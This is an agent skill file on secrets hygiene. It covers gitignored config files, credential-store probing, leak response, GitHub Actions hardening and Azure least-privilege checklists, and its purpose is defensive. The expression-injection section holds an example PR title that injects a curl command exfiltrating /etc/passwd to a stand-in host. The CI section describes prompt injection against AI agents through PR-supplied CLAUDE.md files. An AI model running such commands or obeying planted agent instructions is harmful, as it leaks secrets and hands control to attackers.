---
name: secrets-hygiene
description: "Use when handling API keys, passwords, tokens, OAuth secrets, device credentials, OIDC client secrets, PATs, account IDs, or any other identifying or authenticating value. Covers gitignored secret files, tracked sample templates with placeholder literals, single canonical secret file per project (config.toml + config.example.toml is the default for a new project; an estate or project convention overrides it, so check for one before inferring from file extensions), per-deployment identity from the secret store (never hard-coded), static-credential expiry tracking and rotate-in-place via the secret store, the \"treat as non-rotatable\" defensive default, and the leak-response procedure when a real literal lands in tracked output. Offers to migrate existing code to the gitignored pattern. Also fires on questions ABOUT a credential you must not read: whether two secrets on different hosts are the same (hash each in place, compare short digests), what a credential can actually do (an inert write probe with a known-good control, since an API's permissions field usually describes the principal and a token's name is only a note somebody typed), and when it expires (ask the service; an absent expiry field means none is set, not that this kind does not report one). Also covers GitHub Actions secrets discipline (prefer OIDC over long-lived PATs; least-privilege GITHUB_TOKEN; no secrets in pull_request_target with fork checkout; expression injection and pwn-request defence) folded from xixu-me/skills/github-actions-docs and getsentry/skills/gha-security-review. Includes Azure Entra ID OIDC and RBAC narrow checklists (federated identity credentials over client secrets; roleAssignments/write privilege ladder) folded selectively from microsoft/azure-skills/entra-app-registration and microsoft/azure-skills/azure-rbac. Deep concept references (load on demand): secrets-management-concepts.md (secret lifecycle, sprawl, dynamic vs static secrets, rotation patterns, zero-downtime rotation, envelope encryption, HSMs, zero-trust distribution) and pki-concepts.md (CA hierarchy, X.509 structure and extensions, chain validation, CRL/OCSP/stapling/CAA, Certificate Transparency, ACME protocol and challenges, key algorithms, compliance). For HashiCorp Vault operations see hashicorp-vault-ops; for certificate issuance see cert-manager and lets-encrypt. Concept references folded from chrishuffman5/domain-expert/plugins/security/skills/secrets and its pki subtree (MIT)."
license: MIT
metadata:
  version: 1.5.0
---

# Secrets Hygiene

> **Skill marker**: When applying this skill, begin your reply with `[skill: secrets-hygiene]` on its own line so the transcript shows the skill fired. If multiple skills fire on the same reply, emit each marker on its own line at the top: transparency over neatness.

## Overview

Secrets (passwords, API keys, tokens, device credentials, identities) live ONLY in gitignored secret files. Real literals never leak into tracked artefacts, prose docs, commit history, CI logs, or tool output that gets persisted. Per-deployment identities come from the configured secret store, not from defaults baked into the code.

**Core principle:** the only place a real secret may appear is the gitignored secret file on the machine that needs it.

## The Iron Rule

```
NO REAL CREDENTIAL VALUES IN TRACKED ARTEFACTS, EVER.
NO USER IDENTITIES OR ACCOUNT IDS BAKED INTO SHIPPED CODE.
TREAT REAL CREDENTIALS AS NON-ROTATABLE UNTIL THE USER CONFIRMS OTHERWISE.
```

## Where secrets live

Secrets live in gitignored files only. **Check first whether the estate or project pins a secret-file convention**, in its standing rules, memory, or `CLAUDE.md` / `AGENTS.md`. Where one exists it decides this, and it overrides both the default below and whatever the surrounding language usually does. Credentials are exactly the surface an estate pins, so do not infer the convention from the file extensions you happen to see.

### Default for a new project: one `config.toml`

Absent such a rule, default to a single **`config.toml`** (gitignored, operator-populated, holds the real values) paired with a tracked **`config.example.toml`** template. One convention per project, not a mix of `.env` and `config.ini` and `config.py`. Three reasons it beats the per-language habits:

- **Non-executable.** A stray line in `config.toml` is a parse error. A stray line in `config.py` runs.
- **Handles structure.** Arrays-of-tables express a device list or a per-environment block directly; `.env` flattens everything to strings and invites `FOO_1_HOST` naming.
- **One place to look.** A project with three secret formats has three gitignore entries, three loaders, and three chances to track one by accident.

Python reads it with stdlib `tomllib` on 3.11+ (`tomli` below that), so this costs no dependency on a modern runtime.

### What you will meet in existing projects

These are the established per-language names. Recognise them, and **match the surrounding project** rather than half-migrating it:

- `config.py` (Python services)
- `.env` / `.env.local` (Node, Vite, generic shell)
- `secrets.json` / `secrets.yaml`
- `*.local.toml` (Rust, Cargo workspaces)

Migrating an existing `config.py`-secret project is a bounded piece of work, not a side effect of unrelated changes: add `config.toml`, replace `config.py` with a tracked secret-free adapter that loads it and re-exposes the same imported names (so call sites do not churn), then move the old secret-bearing file aside. Propose it as its own change; never leave a project half-converted.

Pair every gitignored secret file with a tracked sample template using that project's naming convention (`config.example.toml`, `config.py.sample`, `.env.example`). The sample illustrates schema and comments; values are placeholder literals like `'CHANGE_ME'`, `'<your-api-key>'`, or empty strings.

## Where secrets MUST NEVER appear

- README, plans, AGENTS.md, design docs, runbooks, ADRs, any human-written prose.
- Commit messages, branch names, PR titles, PR descriptions, code review comments, CI logs.
- Any tracked `*.sample` / `*.example` / `*.template` (use placeholder literals, never real values).
- TodoWrite entries, plan files, persisted summaries, agent return messages.
- Bug-report scaffolds, support tickets, screenshots without redaction.

When discussing the gap in writing, say "the hardcoded `wrsroot` password" or "the device root credential", never the value itself.

**CI log masking is not a control.** GitHub Actions masks the literal secret value in logs, and that is all it does. Two ways a secret walks straight past it:

- **Derived values are not masked.** `ENCODED=$(echo "${{ secrets.API_KEY }}" | base64); echo "$ENCODED"` prints cleanly. Any transform (base64, hash, substring, JSON-wrap) defeats the mask.
- **Secrets written to files leave in artifacts.** `echo "${{ secrets.DEPLOY_KEY }}" > deploy_key.pem` followed later by an `upload-artifact` with `path: .` ships the key. Artifacts are neither signed nor scanned.

Treat masking as a courtesy, never as the reason a pattern is safe. Same family as the `set -x` and `curl -v` leaks above.

## Probing the credential store

Two distinct operations on a credential store: **probe** (does this credential exist?) and **use** (give me the value so I can pass it to a consumer). They need different patterns; mixing them up leaks the value into shell stdout, which lands in CI logs, agent transcripts, and terminal scrollback.

### Probe: exit code only, never the value

Use the credential store's lookup-by-metadata mode and redirect output:

| Store | Probe |
|---|---|
| macOS Keychain | `security find-generic-password -s NAME > /dev/null 2>&1 && echo found` |
| Linux libsecret | `secret-tool lookup KEY VALUE > /dev/null 2>&1` |
| GNU pass | `pass show NAME > /dev/null 2>&1` |
| 1Password CLI | `op item get NAME > /dev/null 2>&1` |
| HashiCorp Vault | `vault kv get -field=value PATH > /dev/null 2>&1` |
| Env var | `[[ -n "${MY_VAR:-}" ]] && echo set` |

NEVER probe with `-w`, `--show-password`, `--raw`, `-field`, or any other flag that prints the value, unless the output is redirected to `/dev/null` or piped straight into a consumer in the same command.

### Use: inline pipe to the consumer, never via an echoed variable

When you need the value, fetch and consume it in the same command so the value never lands in a free variable that might be printed later:

```bash
# Right: assignment consumed in the same command, no free echo
GH_TOKEN=$(security find-generic-password -a "$USER" -s gh_<org>_pat -w) gh pr list

# Right: stdin pipe, value never enters shell context
pass show docker | docker login -u USER --password-stdin

# Wrong: capture then echo (lands in transcript)
TOKEN=$(security find-generic-password -a "$USER" -s gh_<org>_pat -w)
echo "Token starts with $TOKEN"

# Wrong: probe with -w and no redirect (lands in transcript)
security find-generic-password -a "$USER" -s gh_<org>_pat -w && echo found
```

Beware `set -x` / `set -v` debug modes; they echo variable assignments to stderr, leaking the right-hand side. Disable them around credential-fetching commands. Beware `-v` / `--debug` on consumer tools: curl logs `Authorization:` headers; some CLIs log token values on token-set events.

## Characterising a credential without reading it

Probe and use are not the only two operations. A third comes up constantly and has no obvious recipe, so people reach for the value by default: questions **about** a credential rather than about its existence. Are these two the same secret? What can this one actually do? When does it expire?

Each has an answer that touches no value at all. Reading the value to find out is precisely what the question was trying to avoid, so treat "I will just look at it" as the failure mode, not the fallback.

### Are these two the same secret?

Hash each one **in place, on the host that holds it**, and compare only the digests. Nothing secret crosses the network, nothing lands in a transcript, and the answer is exact rather than inferential.

```bash
# Run separately on each host. Print a short prefix, never the full digest.
security find-generic-password -s <entry> -w | tr -d '\n' | shasum -a 256 | cut -c1-12   # macOS Keychain
sudo cat /path/to/secret | tr -d '\n' | shasum -a 256 | cut -c1-12                        # a file on another host
```

- **Normalise before hashing, on both sides.** A trailing newline changes the digest, so two hosts whose extraction commands differ in that one respect report "different secrets" for an identical value. `tr -d '\n'` on every side, or the comparison is worthless in the direction that matters (a false "these differ" reads as reassuring).
- **Print a prefix, not the whole hash.** Twelve hex characters distinguish a handful of candidates and are useless for anything else.
- **It is still a read**, done by a process rather than by you, so do it only with the owner's say-so.

### What can this credential actually do?

Two traps first, because both produce a confident wrong answer.

**A self-reported permission field usually describes the principal, not the credential.** GitHub's `GET /repos/{owner}/{repo}` returns a `permissions` object, and for a fine-grained PAT it reflects **the user's role on the repo**, not the token's scope. A read-only token and a write token held by the same admin return an identical all-true `{admin, maintain, push, triage, pull}`. Check what any such field is actually a property of before letting it answer a question about a credential.

**A credential's name is a note somebody typed.** "Read-only" in a token's label, an entry name, or a prior memory note is not evidence, and neither is identifying a credential by elimination from a list.

The recipe is an **inert write probe**: a call the permission gates, chosen so it mutates nothing even when it succeeds.

| | |
|---|---|
| Probe | `PATCH /repos/{owner}/{repo}` with an **empty JSON body** |
| Denied | `403 Resource not accessible by personal access token` |
| Permitted | `200`, and no field changes, because the body names none |

- **Always run a control.** This is the load-bearing half, not a nicety. A bare 403 could equally mean a wrong URL, a resource the credential cannot see, or a dead credential; only a paired success from a known-good credential proves the probe detects the capability when it is there.
- **Verify nothing moved afterwards** from a timestamp the service maintains (`updated_at`, a version counter, an audit entry), so "inert" is observed rather than assumed.
- **The shape generalises.** Look for a call the permission gates but whose payload can be empty or a no-op write of the current value. Where no such call exists, say the capability is untested rather than inferring it; a genuinely mutating test only causes damage in exactly the case you were testing for.

### When does it expire?

Ask the service, not the credential's type and not a note beside it. Many APIs return expiry on any authenticated call, for example GitHub:

```bash
curl -sI -H "Authorization: Bearer $TOK" https://api.github.com/user \
  | grep -i github-authentication-token-expiration
```

**An absent field means no expiry is configured, not that this kind of credential does not report one.** The inference from type is the easy mistake and it is backwards: two tokens of the same kind, issued from the same account, will differ here purely because of what was chosen at creation.

**A non-expiring credential flips the risk rather than removing it.** It will never cause the outage that a lapsed one causes, so nothing ever forces a rotation and nothing prompts anyone to think about it. The exposure moves from availability to security: standing access, held indefinitely, usually shared more widely than anyone remembers. Record it as an accepted risk with a named owner, or rotate it; what it must not be is unlisted because it never breaks.

Whether that matters depends entirely on the capability, which is why the write probe above comes first. A non-expiring **read-only** credential on an unattended host is a reasonable posture; the same credential with write scope is the thing to raise.

## Treat as non-rotatable by default

Many real-world credentials cannot be rotated cheaply, sometimes not at all from your side: vendor-set device passwords, infrastructure root accounts, supplied API keys, hard-coded firmware credentials, OEM SNMP communities. Don't assume rotation is available. The defence is *not leaking in the first place*.

If a leak happens, rotation is the user's call (it may not be possible). Scrub the file regardless; git history is permanent.

## One source of truth, scoped sensibly

Don't fragment the same credential across many places. Each project gets a single canonical secret file pattern. If scoping is needed (one config per service / device class), keep it consistent within the project and document the scope.

| Good | Bad |
|---|---|
| One `config.py` per service folder, documented | The same `aaa_password` literal copy-pasted across five scripts |
| One `.env` for the app + `.env.test` for the suite | Three different files with overlapping values |
| One per device class (`mikrotik.env`, `ubiquiti.env`) | One per device, multiplying with the fleet |

When in doubt, prefer fewer, broader configs over many narrow ones.

## Per-deployment identity from the secret store

Never embed user identities, PATs, contact handles, account IDs, or "the developer's email" in shipped code. Adapters require these as constructor parameters; the wiring layer reads them from the project's secret store (`packages/secrets`, env vars, secret manager, whatever the project uses). No defaults that point to a developer.

Wrong:
```ts
const ESCALATE_TO = "alice@example.com";  // baked into source
```

Right:
```ts
class Notifier {
  constructor(private opts: { escalateTo: string }) {}
}
// wiring layer:
new Notifier({ escalateTo: secrets.read("ESCALATE_TO") });
```

## Static credentials track expiry

Every PAT, API key, signed cert, OAuth refresh token, or otherwise long-lived static credential carries an `expiresAt` field somewhere a monitor can read it. Seven days before expiry, raise an urgent rotate-in-place ticket. Rotation uses the secret store, never a redeploy.

Read the expiry off the service where it offers one (see Characterising a credential without reading it above), rather than off the credential's type or a note beside it. If the upstream system genuinely does not expose an expiry, store the issue date plus the documented validity window (e.g. "GitHub fine-grained PATs: 1 year max") and compute `expiresAt`.

## How to apply (workflow)

1. Add the real config file's name to `.gitignore` BEFORE the first `git add`. Patterns to include up-front: `*.env`, `**/config.py`, `**/secrets.json`, `**/*.local.toml`.
2. Create the tracked sample template alongside it, with placeholder values.
3. Never quote a real literal in tool output that gets persisted (TodoWrite, plan files, summaries, commit messages).
4. When extracting a real value from one place to another, use ssh + grep + redirect on the remote machine so the literal never lands in your local tool output. Then `scp` or `rsync` the file back if needed.
5. When wiring per-deployment identity, read from the secret store; do not default to a developer's handle.
6. Never point a subagent at a live secret file. Do credential-adjacent extraction yourself in the main agent, projecting only the non-secret fields (see below).

## Never delegate a live secret-file read to a subagent

A subagent (Explore, general-purpose, a Workflow `agent()`) cannot be relied on to honour a "do not quote the secret" brief. Even an explicit instruction like "note the file's structure only, never quote a credential literal" gets disobeyed: the subagent reads the gitignored `config.py` / `.env` and quotes the live token verbatim in its return message, which lands in the transcript (a persisted artefact).

The brief is not the control. The control is **never giving the subagent access to the live secret in the first place**:

- Point the subagent at the tracked `*.sample` / `*.example` template (placeholders only) to learn the schema, never at the live secret file.
- Do the extraction of real device lists / inventory yourself in the main agent, server-side, projecting only the non-secret columns. Guard the projection so a secret field can never print even if the schema is wrong:

  ```python
  # name@0, ip@1; credential is @2+. Print only 0 and 1, and only if @1 looks like an IP.
  import re; ipre = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")
  for el in elements:
      ip = el[1] if ipre.match(str(el[1])) else "<non-ip-suppressed>"
      print(el[0], ip)   # the @2+ token/password is never referenced
  ```

If a subagent does leak a literal, follow Leak response below; the transcript `.jsonl` is a persisted artefact, so treat the credential as exposed even though no tracked file changed.

## Leak response

If a real literal accidentally lands in a tracked file or git history:

1. Notify the user immediately. Do not try to hide it.
2. Scrub the file in the working tree.
3. Flag that git history is permanent; rotation may be needed but is the user's call (some credentials cannot be rotated).
4. If it landed in a public branch / PR / CI log, escalate (the leak is wider than the local repo).

## Migration when existing code embeds secrets

If you encounter a codebase with hardcoded credentials, embedded user identities, or a `passwords.txt` checked into git:

1. Call it out in the same turn you noticed it.
2. Offer to migrate to the gitignored-config + sample-template pattern.
3. Do not push the new pattern unilaterally; the user may have constraints (e.g. the leaked credential cannot be rotated, so the change order matters).

## GitHub Actions secrets discipline

Folded from xixu-me/skills/github-actions-docs and getsentry/skills/gha-security-review.

### Prefer OIDC over long-lived PATs

When a workflow needs to authenticate to a cloud (AWS, Azure, GCP) or a downstream service (npm, PyPI, container registry), prefer OpenID Connect (workflow-issued short-lived token exchanged for the cloud's credential) over a long-lived PAT or service account key stored in `secrets`.

Why: an OIDC-issued token cannot leak in a way that survives the workflow run. A long-lived PAT in `secrets` can be exfiltrated by any compromised workflow that has access to it, and stays valid until rotated.

| Cloud / service | OIDC pattern |
|---|---|
| AWS | `aws-actions/configure-aws-credentials@<sha>` with `role-to-assume` and `audience` |
| Azure | `azure/login@<sha>` with `client-id` + `tenant-id` + federated identity credential (no `client-secret`) |
| GCP | `google-github-actions/auth@<sha>` with `workload_identity_provider` |
| npm | `npm publish --provenance --access public` (uses OIDC for Sigstore attestation) |
| PyPI | `pypa/gh-action-pypi-publish@<sha>` with trusted publisher (no API token) |

**Scope the trust policy on the cloud side, or OIDC buys you nothing.** The token carries a `sub` claim the cloud provider matches against. A wildcard match lets ANY workflow ref assume the role, including one from a fork PR, which silently undoes the whole reason for leaving PATs behind:

| `sub` condition | Risk | Why |
|---|---|---|
| `repo:org/repo:*` | High, never use | Any ref, any workflow, including fork PRs |
| `repo:org/repo:ref:refs/heads/main` | Medium | Branch-pinned, but any workflow on that branch |
| `repo:org/repo:environment:production` | Low | Requires environment protection rules (reviewers, wait timers, branch restrictions) |

Companion smell worth flagging in review: `permissions: id-token: write` on a `pull_request` workflow that does not deploy anything.

If a long-lived PAT is genuinely needed (legacy system, no OIDC support), follow the static-credential expiry rule above (track `expiresAt`, urgent rotation seven days before expiry), and **use a fine-grained PAT, never a classic one**. A classic PAT is scoped to every repo the account can reach, so one leak is an account-wide blast radius; a fine-grained PAT is per-repo and per-permission, carries mandatory expiry, and supports IP allowlisting plus optional org approval. The trivy compromise is the worked case: a single stolen classic `AUTO_COMMIT_PAT` was used to flip the repo private, delete releases 0.27.0 through 0.69.1, and push a malicious artifact to the VSCode marketplace.

### Least-privilege `GITHUB_TOKEN`

Set `permissions:` at the workflow root (or per-job) to the minimum required. Default `permissions: read-all`, then grant `write` only where the job needs it (e.g. `pull-requests: write` for the comment-posting job, `contents: write` for the release job). Do NOT use repo-level "permissive" `GITHUB_TOKEN` defaults; explicitly scope.

### No secrets in `pull_request_target` workflows that check out fork code

The single most-exploited GitHub Actions vulnerability class. If a workflow uses `pull_request_target` (which has secrets) AND checks out the fork's code (with `actions/checkout` `ref:` pointing at PR head), an attacker can run arbitrary code with the workflow's secrets and `GITHUB_TOKEN`.

Defence:

- Use `pull_request` (no secrets, runs in fork context) by default for fork-PR validation.
- If you genuinely need `pull_request_target` (e.g. for label-management on fork PRs), do NOT check out fork code in the same workflow. Split into a separate `pull_request`-triggered job for the fork-code work.
- Never load configuration from PR-supplied files (`CLAUDE.md`, `AGENTS.md`, `Makefile`, `.cursorrules`) inside a `pull_request_target` workflow.

#### Defending an AI agent running inside CI

A special case of the rule above, and one that applies to every repo in this estate, because they all carry `AGENTS.md` or `CLAUDE.md` and agents are run against them. If a workflow feeds a PR-supplied agent-instruction file to an LLM in CI, the attacker hijacks the agent's behaviour rather than running shell commands directly. `subagent-delegation` covers detecting this class in review; the defences are:

- **Put agent-instruction files under CODEOWNERS.** `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, and `.github/copilot-instructions.md` each get an owning review team.
- **Restrict the CI agent's tool allowlist.** Read-only is the default posture: `allowed_tools: "Read,Grep,Glob"`, with no Bash and no Write.
- **Never set a wildcard user allowlist.** `allowed_non_write_users: '*'` hands the agent to anyone who can open a PR.
- **Flag any PR touching an agent-config file for mandatory human review.**

Worked case: ambient-code/platform ran `claude-code-action` under `pull_request_target` with `contents: write` and a wildcard user allowlist. The injected `CLAUDE.md` was refused by the model, so nothing happened, but the workflow configuration was fully vulnerable and the only thing standing between it and compromise was the agent's own judgement. Do not make the model the last line of defence.

### Expression injection in `run:` blocks

`${{ <github-context-value> }}` inside a `run:` block expands to shell BEFORE the shell quotes it. If the context value is attacker-controlled (PR title, branch name, commit message, issue body), the attacker can inject shell commands.

Wrong:
```yaml
- run: echo "PR title is ${{ github.event.pull_request.title }}"
```

An attacker opens a PR titled `"; curl evil.example/$(cat /etc/passwd | base64); echo "`; the runner executes their commands.

Right:
```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

The expression goes into an env var first; the shell sees `$PR_TITLE` (a normal variable expansion, properly quoted), not the injectable string.

Safe contexts (NOT injectable):

- `${{ }}` in `if:` conditions; evaluated by the Actions runtime, not shell.
- `${{ }}` in `with:` inputs; passed as string parameters to actions.
- `${{ secrets.* }}`; not an expression-injection vector (it's the value, not parsed).
- `${{ github.repository }}`, `${{ github.repository_owner }}`, numeric IDs, SHAs; the repo owner controls these or they are not text the attacker chooses.

### Pin third-party actions to full SHA

A tag is mutable: the action's owner, or an attacker who compromises them, can move it to point at malicious code. This is not hypothetical. In March 2025 the third-party action `tj-actions/changed-files` had its tags v1 through v45.0.7 repointed to a malicious commit that exfiltrated CI secrets into the build logs (CVE-2025-30066); every workflow pinned to a tag ran the attacker's code, every workflow pinned to a full SHA was untouched. Pin third-party actions as `owner/action@<40-char-sha>  # vX.Y.Z` so the content cannot change without your review, and use Dependabot (or equivalent) to surface the SHA bumps as a PR you diff before merging.

**First-party actions are the exception.** GitHub controls the `actions/*` and `github/*` namespaces, so a major-version tag (`actions/checkout@v4`) is acceptable there and keeps the churn down; SHA-pinning them too is defensible defence-in-depth but not required. The mandatory rule is third-party actions.

### Specialist GHA security review pass

For a thorough audit (existing repo with many workflows; pre-merge review of a workflow change in a sensitive repo), dispatch a specialist sub-agent with the brief from `subagent-delegation` § Specialist review dispatches. The brief covers pwn-request, expression injection, comment-triggered commands, credential escalation, config-file poisoning, supply chain, permissions / secrets, runner infrastructure. Each finding requires entry point + payload + execution mechanism + impact + PoC sketch (no theoretical findings).

## Azure Entra ID and RBAC narrow checklist

Folded selectively from microsoft/azure-skills/entra-app-registration and microsoft/azure-skills/azure-rbac. The full upstream skills depend on `azure__*` MCP tools (documentation, bicepschema, extension_cli_generate); the checklists below are the vendor-agnostic discipline that applies regardless of whether those tools are connected. Upstream retired `azure-rbac` on 2026-07-17 with no successor skill, so that link now 404s; the checklist below is retained deliberately, which is the point of having genericised it away from the MCP tooling in the first place.

### App registration credential choice

Three credential types for confidential clients (web apps, services, daemons). Preference order:

1. **Federated identity credential (FIC):** no long-lived secret. Exchange a workflow-issued OIDC token (GitHub Actions, GitLab CI, AKS workload identity, etc.) for an Azure AD token. Best for CI / CD and pod identities.
2. **Certificate:** long-lived but tied to a private key the secret store holds (Key Vault, HSM). Better than client-secret for production because compromise requires both the cert metadata AND the private key.
3. **Client secret:** long-lived password-equivalent. Use only when the upstream system cannot do FIC or cert. Tracks `expiresAt`; rotate via Key Vault, never via redeploy. The portal "copy the value immediately, only shown once" warning means the secret store is the only persistence layer.

If a client secret is in use, follow the global "static credentials track expiry" rule above. Microsoft Entra defaults to 6-month or 24-month expiry depending on tenant policy; surface the choice explicitly when creating one.

### Role assignment privilege ladder

To assign RBAC roles to identities, the assigner needs `Microsoft.Authorization/roleAssignments/write`. Built-in roles that grant it:

- **User Access Administrator** (least-privilege option for the assigner; can ONLY assign roles, no other elevated permission).
- **Owner** (full control AND role assignment; over-privileged for the role-assignment task alone).
- **Custom Role** with the specific `roleAssignments/write` permission scoped to the resource.

Do NOT default to Owner for someone whose only job is to grant access. User Access Administrator scoped to the relevant subscription / resource group is the correct least-privilege answer.

### Least-privilege role for the assigned identity

When picking a role for an identity (managed identity, service principal, user), default to the most-restrictive built-in that satisfies the use case. If no built-in matches, define a custom role with the exact `actions` and `notActions`. Do NOT grant Contributor as a placeholder; Contributor on a subscription is one mis-step away from production damage.

### Service principal vs managed identity

For Azure-hosted compute (App Service, Functions, AKS, VMs), prefer managed identity over service principal. Managed identity has no secret to rotate; the platform handles it. Use service principal only when the workload runs OUTSIDE Azure (CI / CD on GitHub, on-prem services).

## Concept references and related skills

The rules above are the always-on handling discipline. For the conceptual layer beneath them, load a reference on demand:

- `references/secrets-management-concepts.md`: the secret lifecycle (generate, store, distribute, rotate, revoke, audit), secret sprawl, choosing a secrets manager, dynamic vs static secrets, rotation patterns and zero-downtime rotation, envelope encryption (KEK/DEK), hardware security modules and FIPS 140-3 levels, zero-trust secret distribution, the External Secrets Operator, GitOps approaches, and common anti-patterns.
- `references/pki-concepts.md`: certificate strategy (public vs private CA, short vs long-lived), CA hierarchy design, X.509 structure and critical extensions, chain validation, revocation (CRL, OCSP, OCSP stapling, CAA, reason codes), Certificate Transparency, the ACME protocol (objects, flow, HTTP-01/DNS-01/TLS-ALPN-01 challenges, rate limits), key algorithms, certificate discovery, PKI design patterns, and compliance.

Related skills:
- `hashicorp-vault-ops`: HashiCorp Vault operations and architecture (secret engines, auth methods, policies, transit encryption, the Vault PKI engine, Agent and VSO, replication, HA cluster operations).
- `cert-manager`: the Kubernetes certificate controller (Issuers, ClusterIssuers, ACME and Vault issuers, in-cluster certificate lifecycle).
- `lets-encrypt`: the public ACME CA, certbot and acme.sh, challenge automation, and rate-limit handling.
- `utc-timestamps`: certificate validity windows, key rotation timing, and credential expiry are reasoned about in UTC.

## Red flags

- A literal credential string in any file under `git status`
- A real email / handle / account ID baked into a default value
- A `.sample` file with real values "for convenience"
- A PAT or API key with no documented expiry or owner
- A credential established as never-expiring and then left unlisted, with no owner and no accepted-risk note, because nothing will ever break to remind anyone
- A credential's capability taken from a permission field the API returned (usually a property of the principal, not the credential), from its name or entry label, or from identification by elimination
- A capability probe reported without a known-good control, so a denial cannot be told apart from a wrong URL or a dead credential
- Two secrets compared by reading both values, where hashing each in place and comparing short digests would answer it without either value moving
- The same credential value found in three or more files (fragmentation)
- A commit message that quotes a config value
- Tool output (TodoWrite, plan, summary) that quotes a real secret
- `security find-generic-password -w`, `secret-tool lookup`, `op item get`, `vault kv get -field=`, or similar credential-store fetches WITHOUT `> /dev/null` or inline-pipe-to-consumer (probe leaks the value to stdout / transcript / CI log)
- A long-lived cloud credential in `secrets` when the cloud supports OIDC federation
- `permissions: write-all` (explicit or default) on a `GITHUB_TOKEN` that doesn't need it
- A `pull_request_target` workflow that checks out fork code
- A `${{ <attacker-controlled-context> }}` expression directly inside a `run:` block (not env-var-wrapped)
- A third-party action pinned to a tag (`@v4`) instead of a full SHA
- An Azure app registration using a client secret when federated identity credential is available
- A role assignment using Owner when User Access Administrator (or a scoped custom role) would suffice
- A managed-identity-eligible workload using a service principal with a long-lived secret
- A subagent briefed to read a live `config.toml` / `config.py` / `.env` / secret file "for structure only"; the brief is not the control, never give the subagent access to the live secret (point it at the tracked example template; do credential-adjacent extraction in the main agent with non-secret-field-only projection)

## Bottom line

The only place a real secret may appear is the gitignored secret file on the machine that needs it. Everywhere else uses a placeholder, a constructor parameter, or a read from the secret store.
